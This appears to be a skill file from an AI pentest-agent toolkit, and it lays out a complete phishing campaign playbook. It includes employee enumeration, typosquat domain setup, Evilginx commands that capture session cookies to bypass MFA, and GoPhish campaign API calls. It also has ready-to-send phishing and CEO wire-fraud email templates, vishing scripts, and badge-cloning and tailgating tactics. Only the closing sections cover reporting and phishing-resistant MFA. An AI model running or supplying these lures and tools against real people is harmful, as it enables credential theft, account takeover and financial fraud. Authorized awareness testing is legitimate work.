# /phishing — Spear Phishing, Credential Harvesting & Social Engineering

> **Skill type:** Red Team Ops  
> **Source:** 0xsteph/pentest-ai-agents `phishing-crafter`, Ak-cybe social-engineering (8 skills), superhackers  
> **Chains into:** `/credential-audit`, `/lateral-movement`, `/post-exploit`  
> **Chained from:** `/osint` (employee enumeration)

---

## Purpose

Plan and execute authorized phishing simulations: spear phishing emails, credential harvesting pages, pretexting, and vishing. Every technique requires explicit written authorization.

---

## Phase 1: Target Research (Spear Phishing Intel)

```bash
# Employee enumeration
theHarvester -d target.com -l 500 -b linkedin,google,bing -f employees.html

# LinkedIn (manual or API)
# → Job titles: identify sysadmins, executives, finance
# → Email format from one confirmed address → pattern all others
# → Recent posts: identify tech stack, projects, upcoming events

# Email format discovery
# Try known format against email verification API
# Common formats: firstname.lastname, flastname, firstname, f.lastname

# Build target profile (per person)
cat > target-profile.json << EOF
{
  "name": "Jane Smith",
  "title": "Senior Software Engineer",
  "email": "jane.smith@target.com",
  "linkedin": "linkedin.com/in/janesmith",
  "interests": ["Node.js", "Kubernetes", "AWS"],
  "recent_activity": "Posted about migrating to AWS EKS",
  "pretext": "AWS security team notice about EKS cluster"
}
EOF
```

---

## Phase 2: Phishing Infrastructure Setup

```bash
# Domain selection
# 1. Typosquatting: target.com → targett.com, target-corp.com, targ3t.com
dnstwist target.com  # Find registered typosquats

# 2. Look-alike with theme: aws-security-notice.com, github-verify-account.com

# Configure email authentication for phishing domain
# SPF: v=spf1 ip4:YOUR_SMTP_IP ~all
# DKIM: Configure in your SMTP server
# DMARC: v=DMARC1; p=none; rua=mailto:admin@phishing-domain.com
# (p=none so you can monitor without blocking)

# SSL cert for landing page
certbot certonly --standalone -d phishing-domain.com

# Check domain reputation
# Use MXToolBox, mail-tester.com before sending
```

---

## Phase 3: Evilginx3 — Reverse Proxy Harvesting (MFA Bypass)

```bash
# Install and configure
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && make

# Run
./evilginx -p phishlets/ -developer

# Configure
config domain phishingdomain.com
config ipv4 SERVER_IP

# Enable phishlet (e.g., Microsoft 365)
phishlets hostname o365 phishingdomain.com
phishlets enable o365

# Create lure (campaign URL)
lures create o365
lures get-url 0
# Returns: https://login.phishingdomain.com/RANDOMPATH

# Monitor captured sessions
sessions
sessions 1  # View specific session: shows username, password, session cookies

# Key advantage: captures real session cookies → bypasses MFA entirely
# Even if the user has TOTP/SMS MFA, you get their authenticated session
```

---

## Phase 4: GoPhish Campaign Management

```bash
# Start GoPhish
./gophish
# Dashboard: http://127.0.0.1:3333

# Campaign setup via API
curl -X POST https://127.0.0.1:3333/api/campaigns/ \
  -H "Authorization: YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Q4 Security Assessment",
    "template": {"name": "IT Security Notice"},
    "url": "https://phishingdomain.com",
    "page": {"name": "Microsoft Login Clone"},
    "smtp": {"name": "SMTP Profile"},
    "launch_date": "2025-06-01T09:00:00Z",
    "groups": [{"name": "Engineering Team"}]
  }'

# Track: Sent → Opened → Clicked → Submitted Credentials
```

---

## Phase 5: Email Pretext Templates

### Template 1: IT Security Mandatory Action
```
From: IT Security Team <security@target-corp-notice.com>
Subject: [URGENT] Required Security Verification — Action by EOD

Dear [FirstName],

Our security systems have detected unusual access patterns associated with your
account. As a precautionary measure, we require you to verify your identity
within the next 4 hours to prevent account suspension.

Click here to verify: https://target-corp-security.com/verify?token=ABC123

This link expires in 4 hours. If you do not verify, your account will be
temporarily suspended pending investigation.

IT Security Team
[Spoofed signature block]
```

### Template 2: Software Update Notification
```
From: DevOps Team <devops@internal-tools-corp.com>
Subject: Required: Update your AWS credentials before Monday

Hi [FirstName],

As part of our quarterly security rotation, all engineers need to rotate their
AWS access keys. Please update your credentials using the link below before
Monday 9AM or your pipeline access will be revoked.

Update credentials: https://aws-credential-portal.target-corp.com/rotate

Best,
DevOps Infrastructure Team
```

### Template 3: Executive Spear Phish (BEC-style)
```
From: CEO Name <ceo@target-c0rp.com>
To: CFO
Subject: Urgent wire transfer needed

Hi [CFO Name],

I'm in a board meeting and can't talk. We need to process an urgent vendor
payment of $47,500 to close a deal today. Can you process this immediately?
I'll explain everything when I'm out of the meeting.

Wire details:
  Bank: [Bank Name]
  Account: XXXXXX
  Routing: XXXXXX

Do NOT discuss with anyone until after confirmation.

[CEO Name]
```

---

## Phase 6: Vishing (Voice Phishing) Scripts

```
PRETEXT: IT Help Desk

Script:
"Hi [Name], this is Mike from the IT Help Desk. We're seeing some unusual 
login attempts on your account from an IP address in [foreign country]. 
I just need to verify your identity and reset your 2FA to secure the account.
Can you confirm your username and I'll walk you through the reset process?"

→ Goal: Extract credentials, MFA reset, or install "remote support" tool

PRETEXT: Microsoft Azure Support

"Hi, this is Sarah from Microsoft Azure Support. We detected a critical 
security misconfiguration in your company's Azure tenant that could expose 
your data. I need to walk you through the fix remotely. Could you pull up 
your Azure portal and share your screen with me?"

→ Goal: Remote access via legitimate screen-sharing tool
```

---

## Phase 7: Pretexting for Physical Access

```
Badge Clone: Obtain physical access badge (RFID)
  - Use Proxmark3 to clone 125kHz badges
  - Works on HID Prox, EM4100, MIFARE Classic (with key recovery)

Tailgating: Follow authorized employee through secured door
  - Build rapport first at coffee area or lobby
  - Carry something bulky to explain "could you hold that?"

Impersonation: 
  - Vendor/contractor visit
  - IT equipment delivery
  - Fire/safety inspector
  - Job candidate touring the office
```

---

## Phishing Metrics & Reporting

```
Capture these metrics:
  - Total targets sent to
  - Open rate (% who opened)
  - Click rate (% who clicked the link)
  - Credential submission rate (% who entered credentials)
  - Report rate (% who reported the phishing email to security team)

Industry benchmarks (Proofpoint 2024):
  - Click rate: 3.4% average, up to 20%+ for spear phishing
  - Credential submission: ~15% of clickers

Report format:
  "[N] of [Total] employees clicked the phishing link ([%]).
   [N] submitted credentials ([%] of clickers).
   [N] reported the email to the security team ([%] — security culture metric).
   
   Most susceptible: [Department] team ([%] click rate).
   
   Recommendations:
   1. Security awareness training for [Department]
   2. Enable FIDO2/hardware MFA (phishing-resistant)
   3. Deploy email warning banners for external email
   4. Configure DMARC p=reject to prevent spoofing"
```

---

## Phishing-Resistant MFA Guidance

For report remediation section:
```
Current vulnerable MFA types:
  ❌ SMS/TOTP — interceptable by reverse proxy (Evilginx3)
  ❌ Push notifications — susceptible to MFA fatigue attacks
  ❌ Email OTP — vulnerable if email itself is compromised

Phishing-resistant MFA:
  ✅ FIDO2/WebAuthn hardware keys (YubiKey, Titan)
  ✅ Passkeys (device-bound, phishing-resistant by spec)
  ✅ Certificate-based auth (PIV/smart cards)
  
The key property: binds authentication to the origin domain.
Even with Evilginx3 reverse proxy, the authentication will fail
because the origin domain doesn't match the registered credential.
```
